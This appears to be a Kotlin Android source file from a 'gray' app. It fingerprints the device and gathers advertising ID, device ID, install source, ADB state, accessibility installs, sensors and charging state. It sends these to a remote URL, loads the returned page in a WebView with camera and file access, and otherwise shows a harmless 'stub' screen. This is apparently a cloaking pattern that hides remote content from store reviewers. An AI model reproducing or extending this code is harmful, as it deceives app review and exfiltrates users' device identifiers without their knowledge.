package com.gamehivecorp.taptita.gray4

import android.Manifest
import android.os.Build
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.LocalActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.produceState
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.platform.LocalContext
import com.gamehivecorp.taptita.gray4.OpaqueRecursiveManager
import com.gamehivecorp.taptita.gray4.datastore.StorageData
import com.gamehivecorp.taptita.gray4.datastore.StorageImpl
import com.gamehivecorp.taptita.gray4.datastore.StorageState
import com.gamehivecorp.taptita.gray4.urlgenerator.UrlGenerator
import com.gamehivecorp.taptita.gray4.urlgenerator.listOfKeys
import com.gamehivecorp.taptita.gray4.webview.CustomWebChromeClient
import com.gamehivecorp.taptita.gray4.webview.CustomWebView
import com.gamehivecorp.taptita.gray4.webview.CustomWebViewClient
import com.gamehivecorp.taptita.gray4.webview.LauncherCallbacks
import com.gamehivecorp.taptita.gray4.webview.setupView
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlin.random.Random

@Composable
fun Gray4(toStub: () -> Unit, toNoNet: () -> Unit, isInternetCheck: ()  -> Boolean) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val activity = LocalActivity.current as? ComponentActivity
    var isPushHandled by remember { mutableStateOf(false) }
    var isStubTriggered by remember { mutableStateOf(false) }
    val storage = remember { StorageImpl.getInstance(context) }
    val storageState by produceState<StorageState<StorageData>>(initialValue = StorageState.Loading) {
        val savedLink = storage.getString(LINK_STORAGE_KEY)
        val savedStub = storage.getString(STUB_STORAGE_KEY) == STUB_STORAGE_VALUE_TRUE
        val savedPush = storage.getString(PUSH_STORAGE_KEY) == PUSH_STORAGE_VALUE_TRUE
        val result = StorageData(savedLink, savedStub, savedPush)
        value = StorageState.Success(result)
    }

    val callbackHolder = remember { LauncherCallbacks() }

    val launcher2 = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetMultipleContents()
    ) { selectedUris ->
        callbackHolder.valueCallback?.onReceiveValue(selectedUris.toTypedArray())
    }

    val cameraPermLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { granted ->
        val req = callbackHolder.pendingPermissionRequest ?: return@rememberLauncherForActivityResult
        callbackHolder.pendingPermissionRequest = null

        if (granted) {
            req.grant(req.resources)
        } else {
            req.deny()
        }
    }

    var savedPush by remember { mutableStateOf<Boolean?>(null) }
    var savedStub by remember { mutableStateOf<Boolean?>(null) }

    var ready  by remember { mutableStateOf<Boolean>(false) }
    var savedLink2  by remember { mutableStateOf<String?>(null) }
    var linkFlowStarted by remember { mutableStateOf(false) }

    LaunchedEffect(storageState) {
        val state = storageState
        if (state is StorageState.Success) {
            savedStub = state.data.stub
            savedPush = state.data.push
            val savedLink = state.data.link
            savedLink2 = savedLink ?: ";ff;${Random.nextLong()}"
            ready = true
        }
    }

    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if(!isGranted){
            CoroutineScope(Dispatchers.IO).launch {
                storage.putString(PUSH_STORAGE_KEY, PUSH_STORAGE_VALUE_TRUE)
            }
        }
        isPushHandled = true
    }

    LaunchedEffect(savedPush) {
        val savP = savedPush ?: return@LaunchedEffect
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !savP) {
            launcher.launch(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            isPushHandled = true
        }
    }

    LaunchedEffect(isPushHandled, isStubTriggered) {
        Log.d("TAGG", " PushHandled: $isPushHandled  StubHandled: $isStubTriggered")
        if (isPushHandled && isStubTriggered) {
            Log.d("TAGG", "Go Stub ")
            CoroutineScope(Dispatchers.IO).launch {
                Log.d("TAGG", "Save Stub TRUE ")
                storage.putString(STUB_STORAGE_KEY, STUB_STORAGE_VALUE_TRUE)
            }
            toStub()
        }
    }

    LaunchedEffect(ready, savedLink2) {
        val sav = savedLink2
        val savst = savedStub
        if(!ready || sav == null || savst == null) return@LaunchedEffect
        if(linkFlowStarted) return@LaunchedEffect
        linkFlowStarted = true
        Log.d("TAGG", "Saved link : $sav")
        if(!sav.startsWith(";ff;")) {
            Log.d("TAGG", "open web")

            withContext(Dispatchers.Main) {
                activity?.let { webViewActivity ->
                    val customWebView = CustomWebView(webViewActivity)
                    val webViewClient = CustomWebViewClient(
                        webViewActivity,
                        onStubRequired = { isStubTriggered = true })
                    val webChromeClient = CustomWebChromeClient(
                        webViewActivity,
                        customWebView,
                        onStubRequired = { isStubTriggered = true },
                        launcher = launcher2,
                        cameraPermLauncher = cameraPermLauncher,
                        callbackHolder = callbackHolder
                    )
                    setupView(customWebView, webViewClient, webChromeClient)
                    customWebView.loadUrl(sav)
                }
            }
        } else {
            Log.d("TAGG", "Check saved Stub")
            isStubTriggered = savst
            if(savst) {
                return@LaunchedEffect
            }
            if(isInternetCheck()) {

                Log.d("TAGG", "Internet OK")
                Log.d("TAGG", "Go generate link")
                scope.launch {
                    val finalUrl = UrlGenerator("https://${BASE_URL}")
                    /*
                *   1 REF_KEY,
                    2 GADID_KEY,
                    3 DEVICE_MODEL_KEY,
                    4 FIRST_TIME_INSTALL_KEY,
                    5 PACKAGE_SOURCE_KEY,
                    6 FIREBASE_INSTALL_ID,
                    //----- device properties
                    7 NETWORK_SECURITY_KEY,
                    8 SENSORS_KEY,
                    9 DEVICE_ID_KEY,
                    10 CPU_KEY,
                    11 BUILD_KEY,
                    12 CHRG_UP_BRIGHT_KEY,
                    13 INSTALL_A11Y_KEY,
                    14 ADB_KEY
                *
                * */
                    OpaqueRecursiveManager.stream(context).collect { (step, value) ->
                        Log.d("TAGG", "Step $step (${listOfKeys[step]}) collected: $value")

                        finalUrl.addQuery(listOfKeys[step], value)


                        if (step == 13) {
                            val completeUrl = finalUrl.build()
                            Log.d("TAGG", "Final URL built: $completeUrl")

                            Log.d("TAGG", "start web: $completeUrl")
                            withContext(Dispatchers.Main) {
                                activity?.let { webViewActivity ->
                                    val customWebView = CustomWebView(webViewActivity)
                                    val webViewClient = CustomWebViewClient(
                                        webViewActivity,
                                        onStubRequired = { isStubTriggered = true }
                                    )
                                    val webChromeClient = CustomWebChromeClient(
                                        webViewActivity,
                                        customWebView,
                                        onStubRequired = { isStubTriggered = true },
                                        launcher = launcher2,
                                        cameraPermLauncher = cameraPermLauncher,
                                        callbackHolder = callbackHolder
                                    )
                                    setupView(customWebView, webViewClient, webChromeClient)
                                    customWebView.loadUrl(completeUrl)
                                }
                            }
                        }
                    }
                }
            } else {
                Log.d("TAGG", "Internet OFF")
                toNoNet()
            }

        }
    }
}